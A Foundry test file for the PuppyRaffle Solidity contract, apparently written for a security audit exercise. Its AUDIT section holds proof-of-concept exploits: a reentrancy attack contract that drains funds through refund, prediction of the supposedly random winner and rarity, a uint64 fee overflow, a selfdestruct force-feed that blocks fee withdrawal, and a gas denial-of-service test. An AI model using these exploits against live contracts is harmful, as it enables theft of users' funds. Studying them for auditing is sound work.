// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console2} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    /*//////////////////////////////////////////////////////////////
                                 AUDIT
    //////////////////////////////////////////////////////////////*/
    function test_denialOfService() public {
        // address[] memory players = new address[](1);
        // players[0] = playerOne;
        // puppyRaffle.enterRaffle{value: entranceFee}(players);
        // assertEq(puppyRaffle.players(0), playerOne);

        vm.txGasPrice(1);

        // We enter our first 100 players
        uint256 numPlayers = 100;
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(i);
        }

        // We calculate the gas spent
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
        uint256 gasEnd = gasleft();

        uint256 gasSpentOne = gasStart - gasEnd;
        console2.log("Gas spent for the first 100 players: ", gasSpentOne);

        // Next 100 players
        address[] memory playersTwo = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            playersTwo[i] = address(i + numPlayers);
        }

        // We calculate the gas spent
        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(playersTwo);
        gasEnd = gasleft();

        uint256 gasSpentTwo = gasStart - gasEnd;
        console2.log("Gas spent for the second 100 players: ", gasSpentTwo);

        assert(gasSpentOne < gasSpentTwo);
    }

    function test_notRandomWinnerIndex() public playersEntered {
        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());

        // `playersEntered` enters 4 users, so players.length is hardcoded here
        // `address(this)` instead of `msg.sender` to match that input with the call to `puppyRaffle.selectWinner()`
        uint256 expectedIndexWinner =
            uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
        address expectedWinner = puppyRaffle.players(expectedIndexWinner);

        puppyRaffle.selectWinner();

        address realWinner = puppyRaffle.previousWinner();
        console2.log("The expected winner is    : ", expectedWinner);
        console2.log("The real winner is        : ", realWinner);
        if (expectedWinner == realWinner) console2.log("Expected winner == real winner");
        assertEq(expectedWinner, realWinner, "winner was not predictable");
    }

    function test_notRandomRarity() public playersEntered {
        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());

        // Reproduce the on-chain calc: `address(this)` is the msg.sender of selectWinner()
        uint256 rarity = uint256(keccak256(abi.encodePacked(address(this), block.difficulty))) % 100;
        uint256 expectedRarity;
        if (rarity <= puppyRaffle.COMMON_RARITY()) {
            expectedRarity = puppyRaffle.COMMON_RARITY();
        } else if (rarity <= puppyRaffle.COMMON_RARITY() + puppyRaffle.RARE_RARITY()) {
            expectedRarity = puppyRaffle.RARE_RARITY();
        } else {
            expectedRarity = puppyRaffle.LEGENDARY_RARITY();
        }

        uint256 tokenId = puppyRaffle.totalSupply(); // 0 for the first mint

        puppyRaffle.selectWinner();

        uint256 actualRarity = puppyRaffle.tokenIdToRarity(tokenId);
        console2.log("Expected rarity : ", expectedRarity);
        console2.log("Actual rarity   : ", actualRarity);
        if (expectedRarity == actualRarity) console2.log("Expected rarity == actual rarity");
        assertEq(actualRarity, expectedRarity, "rarity was not predictable");
    }

    function test_UnsafeCast() public {
        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());

        uint256 numPlayers = 95;
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(i + 1_000_000);
        }
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);

        // Manual calculation in uint256
        uint256 expectedTotalAmountCollected = players.length * entranceFee;
        uint256 expectedFee = (expectedTotalAmountCollected * 20) / 100;
        uint256 expectedTotalFees = expectedFee;

        assertEq(uint256(puppyRaffle.totalFees()), uint256(0), "total fees should be 0 before entering the raffle");
        assertGt(expectedFee, type(uint64).max, "expected fee should be greater than the maximum value of uint64");

        puppyRaffle.selectWinner();

        // Real result in uint64
        uint64 realTotalFees = puppyRaffle.totalFees();

        console2.log("The expected total fees are    : ", expectedTotalFees);
        console2.log("The real total fees are        : ", uint256(realTotalFees));
        assertLt(uint256(realTotalFees), expectedTotalFees, "real total fees isn't minor than expected one");

        // Withdraw function results in a block
        assertTrue(
            address(puppyRaffle).balance != uint256(realTotalFees),
            "puppyRaffle balance shouldn't be equal to the real total fees"
        );
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function test_StrictEqualityBlocks() public playersEntered {
        SelfDestructiveContract selfDestructiveContract = new SelfDestructiveContract(puppyRaffle);
        vm.deal(address(selfDestructiveContract), 1 wei);
        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());
        vm.roll(block.number + 1);

        selfDestructiveContract.destroy();

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function test_reentrancyRefund() public playersEntered {
        ReentrancyContract attackContract = new ReentrancyContract(puppyRaffle);
        vm.deal(address(attackContract), 1 ether);

        uint256 initialAttackerBalance = address(attackContract).balance;
        uint256 initialVictimBalance = address(puppyRaffle).balance;
        console2.log("=== INITIAL STATE ===");
        console2.log("Initial attacker balance  : ", initialAttackerBalance);
        console2.log("Initial victim balance    : ", initialVictimBalance);

        attackContract.startAttack();

        uint256 finalAttackerBalance = address(attackContract).balance;
        uint256 finalVictimBalance = address(puppyRaffle).balance;
        console2.log("=== FINAL STATE ===");
        console2.log("Final attacker balance    : ", finalAttackerBalance);
        console2.log("Final victim balance      : ", finalVictimBalance);

        if (initialAttackerBalance < finalAttackerBalance) {
            console2.log("Reentrancy was successful!");
        } else {
            console2.log("Reentrancy failed");
        }
    }
}

// This goes outside the PuppyRaffleTest contract
contract ReentrancyContract {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function startAttack() external {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));

        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}

// This goes outside the PuppyRaffleTest contract
contract SelfDestructiveContract {
    PuppyRaffle puppyRaffle;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function destroy() external {
        selfdestruct(payable(address(puppyRaffle)));
    }
}
